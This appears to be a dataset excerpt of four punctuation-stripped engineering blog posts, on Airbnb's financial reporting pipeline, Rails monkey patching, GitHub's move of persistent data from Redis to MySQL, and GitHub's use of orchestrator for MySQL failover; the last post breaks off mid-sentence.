606,training-dataset/engineering/478.txt,engineering,Tracking the Money   Scaling Financial Reporting at AirbnbTracking the Money   Scaling Financial Reporting at Airbnb  At Airbnb  the Payments team is responsible for everything related to moving money in Airbnb s global marketplace  We build technology that powers Airbnb s massive daily transaction volume to collect payments from guests and distribute payouts to hosts  Our goal is to make the payment experience on Airbnb delightful  magical  and intuitive   Historically  the payments team s focus was to implement new features  currencies  and payment methods to make payments local in a global business  Our sphere has grown to include compliance  sales taxes  earnings taxes  licenses  and more  as well as reconciliation and financial accounting according to generally accepted accounting principles   Currently  Airbnb s payment and financial accounting system is a complex ecosystem that transacts in 191 countries  with 70  currencies and 20  processors  Not only has Airbnb s transaction volume experienced exponential transaction growth every year  we have also rapidly increased features and products on our platform  Airbnb hopes to become a premier end to end travel service  not only helping people with accommodations but also trip experiences as well   The challenge to maintain the existing financial accounting system to support new products as well as the increasing data volume has become a  mission impossible  sort of a task   Airbnb s Finance Infrastructure engineering team is responsible for delivering accurate  reliable  and comprehensive business financial data to our stakeholders  In this blog post  we ll talk about how we manage to keep track of where all of our money is and how it moves in a scalable way in the face of exploding data size and complexity  as well as to support new Airbnb initiatives and payment products  We ll share the workflow of our deprecated finance system  illustrate its challenges and issues and then describe the new system that we built to replace it   The prior financial system  a MySQL based data pipeline  Built in early 2012 and retired in late 2016  our previous financial system was a MySQL data pipeline  It was a parameterized MySQL ETL that ran nightly to provide financial reporting  and served us faithfully for the past few years  The workflow was as follows   We enabled MySQL database triggers for all our main tables to be able to capture each change to Airbnb reservation and payment records as they happen in real time on a per row basis  This way  we enforced immutability  and ensured all financially relevant events would be captured  This was meant to be a temporary solution to deal with the inherent mutability of the production data  We acknowledge that it wasn t a great pattern  but it was necessary at the time   By being able to replay the history of events with database triggers  we built a set of intermediate helper tables that assist in calculating different reports  For example  we kept track of recognized revenue  guest receivables  future host payouts  liabilities   and other essential components of financial reporting   Based on those helper tables  we built all the financial reporting   The Scaling Challenge  There were some advantages to this approach  Since we only relied on MySQL DB triggers and MySQL guarantees data accuracy  engineers had lots of flexibility to change the business logic and to move very fast  SQL based reports can be written very fast when the logic is simple   However  the SQL based ETL approach was not scaling well   It wasn t the right language for the programming model  SQL is good for lightweight data transformation  It is not designed to handle complicated business data flow  Modern software design principles can not be easily applied to decompose the complexity   The original logic was tightly coupled with our core reservation logic  As Airbnb grew  the company needed to support product logic other than the original reservation flow  e g  we needed to pay professional photographers  translators  and so on  Every product change had a unique money flow  and thus  financial and accounting impacts  As a result  we had to build many additional reports to meet each business need  Because the MySQL logic was structured around reservation logic  it was hard to modify and was extremely error prone when adding new logic for other products   Validation and testing became impossible  To get a comprehensive result  we pulled the data separately for all the different reports and our finance team combined them at their discretion  Because we built all the reports separately  it could be very difficult to tell which change in which report caused issues if there were number mismatches  This was not scalable when the company wanted to change the product or add new products more frequently   As we added more and more reporting logic  and as our transaction volume grew  developing reports using SQL scripts became more complex  and prohibitively so  It became extremely difficult and time consuming to test the logic for accuracy   The nightly runs were taking too much time  As our transaction volume grew and our transformation logic became more complex  the nightly pipeline took more time  A relational database is hard to scale up  It is difficult to shard the data and difficult to leverage a distributed system to process a massive amount of data  Towards the end of its life  we were only able to run it every other day due to its runtime of over 24 hours   Our Goals   As we grow  we needed to be able to cope with dramatically increasing data size and the frequent addition of new Airbnb products and payment channels  Thus  we had two goals for our new system   The new system should give us enough flexibility to support more products as well as deal with product changes or accounting logic changes  To do this  we need to decouple the financial logic from the product logic  The representation of those product behaviors can be very generic in our financial system  e g  how to book the receivable   payable   revenue   tax   etc  Thus we can build very sustainable financial reports based on highly normalized data   The representation of those product behaviors can be very generic in our financial system  e g  how to book the receivable   payable   revenue   tax   etc  Thus we can build very sustainable financial reports based on highly normalized data  The new system should scale horizontally  As volume grows  we should be able to scale out our system by just adding machines   Introducing our new financial reporting pipeline  Our event based financial report is designed to   support all current and future product types in our platform  have a holistic view of all events with financial impact on our platform  horizontally scale as our transaction volume grows  It is powered by Apache Spark  stored on our HDFS cluster  and written in Scala  Spark is a fast and general engine for large scale data processing  with implicit parallelism and fault tolerance  We chose Scala as the language because we wanted the latest features of Spark  as well as the other benefits of the language  like types  closures  immutability  lazy evaluation  etc   This is huge considering our previous language was SQL   A brief overview of how it works  Our new financial reporting system has a concept of different product types  of which reservations are only one  Each product type has its own set of platform and payment events  and a corresponding set of financial events  Thus we can address each product type individually and systematically build up to a holistic report   The system can be thought of as many event handlers that calculate the accounting impact of different products at different points in their life cycle  Because Scala has a strong static type system  while providing full support for functional programming  it is easy to design and write handlers about different products and how to process them   Below is a diagram of how the data flows through the system  Don t worry  we ll explain everything   Platform events are events that provide information about product related changes  like reservations  reservation alterations  photography  cancellations  etc  These usually have some financial expectation associated with them  but it is not always the case  Each time a product is created or updated  we derive an event for that product  For example  when a reservation is booked  we emit a booking event for the reservation product type  A day after the reservation starts  we consider the reservation to have  services rendered   When the service is delivered to the customer  the guest in this case   we can then recognize revenue  These events are important because they have financial accounting implications  and we will talk about those more below   Payment events describe money movement  They can be events where real money moves in and out of Airbnb bank accounts  Payment events also describe stored value  like when someone buys and uses gift cards  There are other kinds of payment events where money may not actually move  but we still have to account for the lack of cash movement  This can be when someone sends someone else a gift card  and that person claims it  We consider those to be balance transfers  or virtual movement  An example of no money movement would be when a guest uses a coupon  The money from the coupon is funded from the marketing budget  but no money has actually moved accounts   we just need to account for it somewhere  Money in must equal money out  Because coupons are on the guest side and don t impact the original host payout amount and likewise the other host side operations  we need to take these into account so the money equation balances   These events are currently generated from examining the aforementioned accounting audit rows for changes  If the change has an accounting impact  then a platform or payment event is generated  This system was designed as a central place for all the data to pass through from different systems  The financial reporting system processes these platform and payment events with event handlers  and produces accounting events that describe the accounting impact of those events   Accounting events are generated by event handlers that build them from the payment and platform events  We introduced this layer of abstraction to represent the relationship between the different platform and payment events for each product  as well as the accounting logic  Sometimes  as you ll see below  a single platform event can generate more than one accounting event  because it has multiple accounting impacts at different times  These events basically keep track of what happened by assigning a unique identifier  the product type and the product id  to a set of activity  For us  we consider the product type and id to be the smallest accounting unit that we operate on   From accounting events  we generate the subledger  which is the basis for all of our financial accounting  Each entry is a detailed accounting record that includes information about the time a transaction occurred  payment or reservation booking   the amount  the currency  the direction of the monetary impact  credit or debit  and the account that it impacts   The subledger is generated using double entry accounting  Double entry accounting allows us to be sure that everything is accounted for properly in the system  This means no money appears or disappears without a source   Even though each product type may behave differently  we ve found a generic life cycle that all product types share  Let s walk through how a reservation would look in this framework   An event happens that introduces some accounting liability  and a contract is created  No money has moved at this point  but expectations for future money flow are set up here  The accounting events at this point describe the contract that has been created   Here  a guest has confirmed a two night reservation for  100  We refer to this time as booking date  and treat it as the contract start date  Of the  100   90 is the price of the stay   10 are fees   This price breakdown is for example purposes only  and does not reflect any real reservation  We ve also left the host fees out of this to simplify the explanation    The guest and the host have entered into a contract with each other  with Airbnb acting as the platform and payment collection agent  In exchange for staying at this listing for two nights  the guest will pay Airbnb  100  and the host will receive  90 some time after check in  On the date of the reservation confirmation  we have a guest receivable of  100  and a future host payable of  90  due to the host when we consider the reservation to be fulfilled  These expectations are set up as soon as the reservation is confirmed   An event s money flow occurs  This can happen anytime after the contract has been created  The accounting events here describe the direction and for what liability the amount is fulfilling   Here  the guest successfully pays  100 for the reservation  We would consider the guest receivable then fulfilled   The event happens and so the contracted service is fulfilled   This is after the check in time  This is the point in which we would recognize revenue and losses  if there are any  In this example  we didn t have any  This is also the time that the scheduled  90 payout for the host should be delivered to the host  This means that the future host payable is now a host payable because it is now due   More money flows may occur   This is when we successfully deliver the  90 payout to the host  Now Airbnb s host payable is  0 for this particular host   Sometimes  there are alterations on a product or a payment  Examples would be a guest adding dates to a reservation inducing a reservation price change  To properly account for the price differences from an alteration  we  unbook  and  rebook  the reservation entirely at the time of alteration   For example  if the reservation was previously booked for  100  and now it is  150 because the guest extended their stay at a later date  we could either book an additional  50 on the later date  or unbook the reservation for  100 and rebook it for  150 on that day  Why do you think we chose to do the latter  It s because when alterations add up  it s much easier to just unbook and rebook  instead of computing the delta every time  It s the cleanest way we can deal with product alterations and data backfills  Just imagine how alterations on a long term reservation would look in our system   Now that we ve built the subledgers from the platform and payment events  and their handlers  we can easily query for the financial impact to different accounts that any event generates   An example of how revenue would be queried from the subledger is as follows   Key Takeaways  It scales while maintaining quality and performance  Our financial reporting pipeline scales both on a product basis  and on a runtime basis  We can easily support new products on the financial engineering side because we ve built a framework around the right abstractions  instead of tying it too closely with one specific product s life cycle  We can also scale horizontally  This is much better than being limited by an Amazon RDS instance  no matter how beefy it may be  Our nightly runtime is 4 5 hours and has not been growing too much as of March 2017   It made troubleshooting much simpler  Before  when our Finance team needed comprehensive reports  we pulled the data separately for all the different reports and our finance team combined them at their discretion  Because we built all the reports separately  it could be very difficult to tell which change in which report caused unexpected deviances  This was not scalable when the company wanted to change the product or add new products more frequently  Now when there s an issue  we investigate data from a single source of truth  significantly simplifying the troubleshooting process   It made coding much simpler  Going from declarative programming to functional programming has been a powerful paradigm shift for us to think about financial processing and accounting  We can now think of this system as a straightforward actor handler system rather than getting mired in complicated SQL join logic   The nightly runs are timely and well monitored  Originally  the MySQL ETL was scheduled via a crontab  and was dependent on data arriving via a different pipeline  Instead of taking upwards of a day to complete  the nightly run takes around 4 5 hours to complete  We no longer have to babysit a legacy system that quite frequently encounters snags caused by upstream changes  taking hours of developer time each week to resolve   We built a comprehensive test framework  This is perhaps the important part of the picture  Because our financial processing and reporting is no longer in SQL  we are now also able to write extensive suites of unit tests against specific handlers  Together with integration tests and smoke tests  we can easily identify regressions and other errors  Smoke tests are rules we expect our data to follow and when rule violations occur  they are logged and addressed  This gives us a high degree of confidence in the quality of our data and lets us quickly vet new changes and roll them out  We have built an extensive  and ever expanding  test suite of real transactions  in which we check how we expect them to look in the system individually as well as in aggregate  This test framework is critical when we have time sensitive requests from our various partners in Finance and Legal  as well as from our audit partners  and need to be confident in our reporting   Future looking  In the future  we will be moving towards an entirely event based system  The financial reporting system will consume events emitted from other systems  Stay tuned to read about that in a future blog post  This will help us with even greater financial integrity and a richer vocabulary with which we can express different products and payment flows   In the end  what we want most at Airbnb is to have is complete  accurate and extensible financial reporting for all of our current and future products at Airbnb  We believe that we have designed the financial reporting system to be a strong foundation of all financial processing at Airbnb  Because of the clean decoupling of business logic and accounting logic  this system is product agnostic  extensible  and future proof  which gives us confidence it will serve us well for many years to come  This is just the start of our back office financial systems at Airbnb   If you enjoyed reading this and thought this was an interesting challenge  the payments team is always looking for talented people to join the team  whether you are a software engineer or a data scientist   Please stay tuned for more on the Payments ecosystem at Airbnb   Many thanks to Sarah Hagstrom  Lou Kosak  Shawn Yan  Brian Wey  Jiangming Yang  and Ian Logan for reading through many drafts and helping me to write this post,"[606 171 1049 613 902 92 707 1351 875 673 695]"
607,training-dataset/engineering/622.txt,engineering,Cutting Corners or Why Rails May Kill RubyToday I m tired and frustrated  And it s not the first time that I have those negative feelings  Typically I just complain on twitter  lose some followers  wait a bit to calm down and move on   But today I need to vent and convert my negative emotions into something constructive and hopefully meaningful to others  Every time I simply whine about certain aspects of Ruby ecosystem and especially Rails people are asking me specific questions that I fail to address properly  Mostly because of a lack of time and the fact twitter is a horrible medium for longer discussions   So here it goes  this post is about what s wrong with monkey patching and the general rails mindset that I see as a potential serious problem which in the long term may simply kill Ruby   Cutting corners through monkey patching  Yesterday I was pointed to a pull request which adds Enumerable pluck to ActiveSupport which was merged in  because why not  It s definitely handy so let s just add it  Besides ActiveRecord has this method and it s so useful so why not just have it for all enumerables   What Rails affected people fail to see  which is easy given DHH is still so proud of ActiveSupport and continuously repeats that on many occasions  is that this is what you do when you introduce a monkey patch   Let s analyze this  there seems to be a problem  maybe we know how to fix it properly but why bother spending time thinking about it and searching for good tools  or even worse   building them   to properly fix it  and hey  we have a duct tape     it ll surely fix it for us and it ll fix it now   The airplane landed thus the author of this fantastic  solution  to a very specific problem claims duct tape is a great tool to fix this kind of issues   This is what we re doing with monkey patches  We re cutting corners and convincing ourselves it solves our problems for good       it s actually called Speed Tape used for temporary fixes  don t freak out when you see it  Addressing immediate needs doesn t solve actual problems  Adding a monkey patch is so easy with Ruby that it doesn t even give you a chance to stop for a second and think  Why am I doing this  What am I trying to solve  What kind of a problem is this monkey patch going to solve  Is it part of a general big problem that could be isolated and solved in a well designed and encapsulated piece of code  Or is it just my immediate  domain specific need to do something that it should stay isolated within my application s namespace   Enumerable pluck maps an enumerable by returning values under specific keys ie   a  1   pluck  a      1    this is handy  I have to admit  The problem here is that it doesn t solve anything  It ll make people pluck the values here and there which will result in a lot of accidental complexity which very often is completely unnecessary if you could only have a place in your system to transform data structures according to specific rules that your application s domain dictates  What you do instead is that you apply an ad hoc approach to programming   rather than solving specific problems and isolating them in order to reduce complexity you just use all those convenient monkey patches in an inconsistent fashion   What if you suddenly need something more sophisticated than a simple pluck  A Rails infected developer would probably think about another monkey patch  why not  right  In fact somebody actually criticized my approach to data transformations in Ruby and said a monkey patch  when done properly  whatever that means    would be more elegant   Identifying specific problems  isolating them from the others and solving them through simple  fast  coherent solutions is the only way to reduce complexity of our systems  Introducing monkey patches is a short sighted  solution  that only adds confusion and decreases cohesion of the systems we re building with Ruby   Stop  Doing  That   How does it affect us   I see it as something that damages our entire ecosystem because lots of people  including those who are just getting into the community  are completely convinced it s the way to do things in Ruby   It s definitely A way of doing things but is it a good way  I doubt that  No  scratch that  I know it is not a good way and it is one of the biggest reasons why lots of Ruby libraries are poorly written because monkey patching also reduces the need of having properly designed interfaces  When something can be monkey patched  why would I introduce an interface to extend my library  Right   We can t continue building systems on top of mountains of monkey patches like Rails  It decreases confidence  introduces additional complexity  teaches people to be ignorant about changes they make to the runtime  makes it very hard to properly identify real problems that we need to solve and the list goes on including very specific problems like  obviously  conflicting interfaces  very hard to debug bugs ending up realizing that something changed our code in an unexpected way etc   Just last week people wasted time because of Object with_options in ActiveSupport  literally two people stumbled upon that and asked me for help as they couldn t understand why something is not working   I also really  enjoyed  debugging my code as something wasn t working as expected just to realize that Object try is another monkey patch from ActiveSupport and I happened to implement try in my object with different semantics  Or how about this series of monkey patches which adds methods like NilClass to_param or TrueClass to_param which is literally there just because Rails is a web framework and happens to need those methods for url_helper  huh  helpers  that could be another rant   Those things fucked up my day more than once  I m talking about many wasted hours in total  Just in my case and I m not the only one   Rails May Kill Ruby  What   I know right  In 2009 Uncle Bob gave a talk at Rails Conf titled  What Killed Smalltalk Could Kill Ruby  and he said  it was too easy to make a mess    Now here s something to think about  Rails is a massive mess  a mountain of monkey patches  a framework that changes Ruby to make it fit better to its own needs  As my friend said  Rails assumes it is on the top of the toolchain   Which is a very smart thing to say  The result of that is a damaged ecosystem and educating people to do things that end up damaging it even more   The irony here is that 99  of Ruby developers became Ruby developers because of Rails  I m just not sure if that has any actual technical meaning in this conversation  What are we supposed to do then  Praise Rails despite the fact many of us progressed as developers and realized many things in Rails are plain wrong   Rails may kill Ruby because many smart people are leaving Ruby or have already left Ruby  I know many of those people and I already miss them  Somebody told me on twitter that it won t happen  that maybe  just experts will leave Rails Ruby   I m sorry but if a given technology makes experts leave it because of serious technical issues then I no longer understand what this is all about,"[607 257 26 316 214 778 1335 61 90 1405 234]"
613,training-dataset/engineering/880.txt,engineering,Moving persistent data out of RedisHistorically  we have used Redis in two ways at GitHub   We used it as an LRU cache to conveniently store the results of expensive computations over data originally persisted in Git repositories or MySQL  We call this transient Redis   We also enabled persistence  which gave us durability guarantees over data that was not stored anywhere else  We used it to store a wide range of values  from sparse data with high read write ratios  like configuration settings  counters  or quality metrics  to very dynamic information powering core features like spam analysis  We call this persistent Redis   Recently we made the decision to disable persistence in Redis and stop using it as a source of truth for our data  The main motivations behind this choice were to   Reduce the operational cost of our persistence infrastructure by removing some of its complexity   Take advantage of our expertise operating MySQL   Gain some extra performance  by eliminating the I O latency during the process of writing big changes on the server state to disk   Transitioning all that information transparently involved planning and coordination  For each problem domain using persistent Redis  we considered the volume of operations  the structure of the data  and the different access patterns to predict the impact on our current MySQL capacity  and the need for provisioning new hardware   For the majority of callsites  we replaced persistent Redis with GitHub  KV   a MySQL key value store of our own built atop InnoDB  with features like key expiration  We were able to use GitHub  KV almost identically as we used Redis  from trending repositories and users for the explore page  to rate limiting to spammy user detection   Our biggest challenge  Migrating the activity feeds  We have lots of  events  at GitHub  Starring a repository  closing an issue and pushing commits are all events that we display on our activity feeds  like the one found on your GitHub homepage   We used Redis as a secondary indexer for the MySQL table that stores all our events  Previously  when an event happened  we  dispatched  the event identifier to Redis keys corresponding to each user s feed that should display the event  That s a lot of write operations and a lot of Redis keys and no single table would be able to handle that fanout  We weren t going to be able to simply replace Redis with GitHub  KV everywhere in this code path and call it a day   Our first step was to gather some metrics and let them tell us what to do  We pulled numbers for the different types of feeds we had and calculated the writes and reads per second for each timeline type  e g   issue events in a repository  public events performed by a user  etc    One timeline wasn t ever read  so we were able to axe it right away and immediately knock one off the list  Of the remaining timelines  two were so write heavy that we knew we couldn t port them to MySQL as is  So that s where we began   Let s walk through how we handled one of the two problematic timelines  The  organization timeline  that you can see if you toggle the event feed on your home page to one of the organizations you belong to  accounted for 67  of the more than 350 million total writes per day to Redis for these timelines  Remember when I said we  dispatched  event IDs to Redis for every user that should see them  Long story short   we were pushing event IDs to separate Redis keys for every event and every user within an org  So for an active organization that produces  say  100 events per day and has 1000 members  that would potentially be 100 000 writes to Redis for only 100 events  Not good  not efficient  and would require far more MySQL capacity than what we are willing to accept   We changed up how writing to and reading from Redis keys worked for this timeline before even thinking about MySQL  We d write every event happening to one key for the org  and then on retrieval  we d reject those events that the requesting user shouldn t see  Instead of doing the filtering each time the event is fanned out  we d do it on reads   This resulted in a dramatic 65  reduction of the write operations in for this feature  getting us closer to the point were we could move the activity feeds to MySQL entirely   Although the single goal in mind was to stop using Redis as a persistent datastore  we thought that  given this was a legacy piece of code that evolved organically over the years  there would be some room for improving its efficiency as well  Reads were fast because the data was properly indexed and compact  Knowing that  we decided to stop writing separately to certain timelines that we could compose from the events contained in others  and therefore reduce the remaining writes another 30    11  overall   We got to a point that we were writing less than 1500 keys per second 98  of the time  with spikes below 2100 keys written per second  This was a volume of operations we thought we could handle with our current MySQL infrastructure without adding any new servers   While we prepared to migrate the activity feeds to MySQL  we experimented with different schema designs  tried out one record per event normalization and fixed size feed subsets per record  and we even experimented with MySQL 5 7 JSON data type for modeling the list of event IDs  However we finally went with a schema similar to that of GitHub  KV   just without some of the features we didn t need  like the record s last updated at and expiration timestamps   On top of that schema  and inspired by Redis pipelining  we created a small library for batching and throttling writes of the same event that were dispatched to different feeds   With all that in place  we began migrating each type of feed we had  starting with the least  risky   We measured risk of migrating any given type based on its number of write operations  as reads were not really the bottleneck   After we migrated each feed type  we checked cluster capacity  contention and replication delay  We had feature flags in place that enabled writes to MySQL  while still writing to persistent Redis  so that we wouldn t disrupt user experience if we had to roll back  Once we were sure writes were performing well  and that all the events in Redis were copied to MySQL  we flipped another feature flag to read from the new data store  again measured capacity  and then proceeded with the next activity feed type   When we were sure everything was migrated and performing properly we deployed a new pull request removing all callsites to persistent Redis  These are the resulting performance figures as of today   We can see how at the store level  writes   mset   are below 270wps at peak  with reads   mget   below 460ps  These values are way lower than the number of events being written thanks to the way events are batched before writes   Replication delay is below 180 milliseconds at peak  The blue line  correlated with the number of write operations  shows how delay is checked before any batch is written to prevent replicas from getting out of sync   What we learned  At the end of the day we just grew out of Redis as a persistent datastore for some of our use cases  We needed something that would work for both github com and GitHub Enterprise  so we decided to lean on our operational experience with MySQL  However  clearly MySQL isn t a one size fits all solution and we had to rely on data and metrics to guide us in our usage of it for our event feeds at GitHub  Our first priority was moving off of persistent Redis  and our data driven approach enabled us to optimize and improve performance along the way   Work with us  Thank you to everybody on the Platform and Infrastucture teams who contributed to this project  If you would like to work on problems that help scale GitHub out  we are looking for an engineer to join us  The Platform team is responsible for building a resilient  highly available platform for internal engineers and external integrators to add value to our users   We would love you to join us  Apply here,"[902 613 1049 1336 606 673 1295 310 980 276 373]"
615,training-dataset/engineering/132.txt,engineering,Orchestrator at GitHubGitHub uses MySQL to store its metadata  Issues  Pull Requests  comments  organizations  notifications and so forth  While git repository data does not need MySQL to exist and persist  GitHub s service does  Authentication  API  and the website itself all require the availability of our MySQL fleet   Our replication topologies span multiple data centers and this poses a challenge not only for availability but also for manageability and operations   Automated failovers  We use a classic MySQL master replicas setup  where the master is the single writer  and replicas are mainly used for read traffic  We expect our MySQL fleet to be available for writes  Placing a review  creating a new repository  adding a collaborator  all require write access to our backend database  We require the master to be available   To that effect we employ automated master failovers  The time it would take a human to wake up   fix a failed master is beyond our expectancy of availability  and operating such a failover is sometimes non trivial  We expect master failures to be automatically detected and recovered within 30 seconds or less  and we expect failover to result with minimal loss of available hosts   We also expect to avoid false positives and false negatives  Failing over when there s no failure is wasteful and should be avoided  Not failing over when failover should take place means an outage  Flapping is unacceptable  And so there must be a reliable detection mechanism that makes the right choice and takes a predictable course of action   orchestrator  We employ Orchestrator to manage our MySQL failovers  orchestrator is an open source MySQL replication management and high availability solution  It observes MySQL replication topologies  auto detects topology layout and changes  understands replication rules across configurations and versions  detects failure scenarios and recovers from master and intermediate master failures   Failure detection  orchestrator takes a different approach to failure detection than the common monitoring tools  The common way to detect master failure is by observing the master  via ping  via simple port scan  via simple SELECT query  These tests all suffer from the same problem  What if there s an error   Network glitches can happen  the monitoring tool itself may be network partitioned  The naive solutions are along the lines of  try several times at fixed intervals  and on the n th successive failure  assume master is failed   While repeated polling works  they tend to lead to false positives and to increased outages  the smaller n is  or the smaller the interval is   the more potential there is for a false positive  short network glitches will cause for unjustified failovers  However larger n values  or longer poll intervals  will delay a true failure case   A better approach employs multiple observers  all of whom  or the majority of whom must agree that the master has failed  This reduces the danger of a single observer suffering from network partitioning   orchestrator uses a holistic approach  utilizing the replication cluster itself  The master is not an isolated entity  It has replicas  These replicas continuously poll the master for incoming changes  copy those changes and replay them  They have their own retry count interval setup  When orchestrator looks for a failure scenario  it looks at the master and at all of its replicas  It knows what replicas to expect because it continuously observes the topology  and has a clear picture of how it looked like the moment before failure   orchestrator seeks agreement between itself and the replicas  if orchestrator cannot reach the master  but all replicas are happily replicating and making progress  there is no failure scenario  But if the master is unreachable to orchestrator and all replicas say   Hey  Replication is broken  we cannot reach the master   our conclusion becomes very powerful  we haven t just gathered input from multiple hosts  We have identified that the replication cluster is broken de facto  The master may be alive  it may be dead  may be network partitioned  it does not matter  the cluster does not receive updates and for all practical purposes does not function  This situation is depicted in the image below   Masters are not the only subject of failure detection  orchestrator employs similar logic to intermediate masters  replicas which happen to have further replicas of their own   Furthermore  orchestrator also considers more complex cases as having unreachable replicas or other scenarios where decision making turns more fuzzy  In some such cases  it is still confident to proceed to failover  In others  it suffices with detection notification only   We observe that orchestrator  s detection algorithm is very accurate  We spent a few months in testing its decision making before switching on auto recovery   Failover  Once the decision to failover has been made  the next step is to choose where to failover to  That decision  too  is non trivial   In semi sync replication environments  which orchestrator supports  one or more designated replicas are guaranteed to be most up to date  This allows one to guarantee one or more servers that would be ideal to be promoted  Enabling semi sync is on our roadmap and we use asynchronous replication at this time  Some updates made to the master may never make it to any replicas  and there is no guarantee as for which replica will get the most recent updates  Choosing the most up to date replica means you lose the least data  However in the world of operations not all replicas are created equal  at any given time we may be experimenting with a recent MySQL release  that we re not ready yet to put to production  or may be transitioning from STATEMENT based replication to ROW based  or have servers in a remote data center that preferably wouldn t take writes  Or you may have a designated server of stronger hardware that you d like to promote no matter what   orchestrator understands all replication rules and picks a replica that makes most sense to promote based on a set of rules and the set of available servers  their configuration  their physical location and more  Depending on servers  configuration  it is able to do a two step promotion by first healing the topology in whatever setup is easiest  then promoting a designated or otherwise best server as master   We build trust in the failover procedure by continuously testing failovers  We intend to write more on this in a later post   Anti flapping and acknowledgements  Flapping is strictly unacceptable  To that effect orchestrator is configured to only perform one automated failover for any given cluster in a preconfigured time period  Once a failover takes place  the failed cluster is marked as  blocked  from further failovers  This mark is cleared after  say  30 minutes  or until a human says otherwise   To clarify  an automated master failover in the middle of the night does not mean stakeholders get to sleep it over  Pages will arrive  even as failover takes place  A human will observe the state  and may or may not acknowledge the failover as justified  Once acknowledged  orchestrator forgets about that failover and is free to proceed with further failovers on that cluster should the case arise   Topology management  There s more than failovers to orchestrator   It allows for simplified topology management and visualization   We have multiple clusters of differing size  that span multiple datacenters  DCs   Consider the following   The different colors indicate different data centers  and the above topology spans three DCs  Cross DC network has higher latency and network calls are more expensive than within the intra DC network  and so we typically group DC servers under a designated intermediate master  aka local DC master  and reduce cross DC network traffic  In the above instance 64bb  blue  2nd from bottom on the right  could replicate from instance 6b44  blue  bottom  middle  and free up some cross DC traffic   This design leads to more complex topologies  replication trees that go deeper than one or two levels  There are more use cases to having such topologies   Experimenting with a newer version  to test  say  MySQL 5 7 we create a subtree of 5 7 servers  with one acting as an intermediate master  This allows us to test 5 7 replication flow and speed   we create a subtree of servers  with one acting as an intermediate master  This allows us to test replication flow and speed  Migrating from STATEMENT based replication to ROW based replication  we again migrate slowly by creating subtrees  adding more and more nodes to those trees until they consume the entire topology   based replication to based replication  we again migrate slowly by creating subtrees  adding more and more nodes to those trees until they consume the entire topology  By way of simplifying automation  a newly provisioned host  or a host restored from backup  is set to replicate from the backup server whose data was used to restore the host   Data partitioning is achieved by incubating and splitting out new clusters  originally dangling as sub clusters then becoming independent   Deep nested replication topologies introduce management complexity   All intermediate masters turn to be point of failure for their nested subtrees   Recoveries in mixed versions topologies or mixed format topologies are subject to cross version or cross format replication constraints  Not any server can replicate from any other   Maintenance requires careful refactoring of the topology  you can t just take down a server to upgrade its hardware  if it serves as a local intermediate master taking it offline would break replication on its own replicas   orchestrator allows for easy and safe refactoring and management of such complex topologies   It can failover dead intermediate masters  eliminating the  point of failure  problem   Refactoring  moving replicas around the topology  is made easy via GTID or Pseudo GTID  an application level injection of sparse GTID like entries    orchestrator understands replication rules and will refuse to place  say  a 5 6 server below a 5 7 server   orchestrator also serves as the de facto topology state inventory indicator  It complements puppet or service discoveries configuration which imply desired state  by actually observing the existing state  State is queryable at various levels  and we employ orchestrator at some of our automation tasks   Chatops integration  We love our chatops as they make our operations visible and accessible to our greater group of engineers  While the orchestrator service provides a web interface  we rarely use it  one s browser is her own private command center  with no visibility to others and no history   We rely on chatops for most operations  As a quick example of visibility we get by chatops  let s examine a cluster   shlomi noach  orc cluster sample cluster Hubot host lag status version mode format extra                             instance e854 0s ok 5 6 26 74 0 log rw STATEMENT    P GTID   instance fadf 0s ok 5 6 26 74 0 log ro STATEMENT    P GTID   instance 9d3d 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 8125 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance b982 0s ok 5 6 26 74 0 log ro STATEMENT    P GTID   instance c5a7 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 64bb 0s ok 5 6 31 77 0 log rw nobinlog P GTID   instance 6b44 0s ok 5 6 31 77 0 log rw STATEMENT    P GTID   instance cac3 14400s ok 5 6 31 77 0 log rw STATEMENT    P GTID  Say we wanted to upgrade instance fadf to 5 6 31 77 0 log   It has two replicas attached  that I don t want to be affected  We can   shlomi noach  orc relocate replicas instance fadf below instance c5a7 Hubot instance 9d3d instance 8125  To the effect of   shlomi noach  orc cluster sample cluster Hubot host lag status version mode format extra                             instance e854 0s ok 5 6 26 74 0 log rw STATEMENT    P GTID   instance fadf 0s ok 5 6 26 74 0 log ro STATEMENT    P GTID   instance b982 0s ok 5 6 26 74 0 log ro STATEMENT    P GTID   instance c5a7 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 9d3d 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 8125 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 64bb 0s ok 5 6 31 77 0 log rw nobinlog P GTID   instance 6b44 0s ok 5 6 31 77 0 log rw STATEMENT    P GTID   instance cac3 14400s ok 5 6 31 77 0 log rw STATEMENT    P GTID  The instance is now free to be taken out of the pool   Other actions are available to us via chatops  We can force a failover  acknowledge recoveries  query topology structure etc  orchestrator further communicates with us on chat  and notifies us in the event of a failure recovery   orchestrator also runs as a command line tool  and the orchestrator service supports web API  and so can easily participate in automated tasks   orchestrator   GitHub  GitHub has adopted orchestrator   and will continue to improve and maintain it  The github repo will serve as the new upstream and will accept issues and pull requests from the community   orchestrator continues to be free and open source  and is released under the Apache License 2 0   Migrating the project to the GitHub repo had the unfortunate result of diverging from the original Outbrain repo  due to the way import paths are coupled with repo URI in golang   The two diverged repositories will not be kept in sync  and we took the opportunity to make some further diverging changes  though made sure to keep API   command line spec compatible  We ll keep an eye for incoming Issues on the Outbrain repo   Outbrain  It is our pleasure to acknowledge Outbrain as the original author of orchestrator   The project originated at Outbrain while seeking to manage a growing fleet of servers in three data centers  It began as a means to visualize the existing topologies  with minimal support for refactoring  and came at a time where massive hardware upgrades and datacenter changes were taking place  orchestrator was used as the tool for refactoring and for ensuring topology setups went as planned and without interruption to service  even as servers were being provisioned or retired   Later on Pseudo GTID was introduced to overcome the problems of unreachable crashing lagging intermediate masters  and shortly afterwards recoveries came into being  orchestrator was put to production in very early stages and worked on busy and sensitive systems   Outbrain was happy to develop orchestrator as a public open source project and provided the resources to allow its development  not only to the specific benefits of the company  but also to the wider community  Outbrain authors many more open source projects  which can be found on their GitHub s Outbrain engineering page   We d like to thank Outbrain for their contributions to orchestrator   as well as for their openness to having us adopt the project   Further acknowledgements  orchestrator was later developed at Booking com  It was brought in to improve on the existing high availability scheme  orchestrator  s flexibility allowed for simpler hardware setup and faster failovers  It was fortunate to enjoy the large MySQL setup Booking com employs  managing various MySQL vendors  versions  configurations  running on clusters ranging from a single master to many 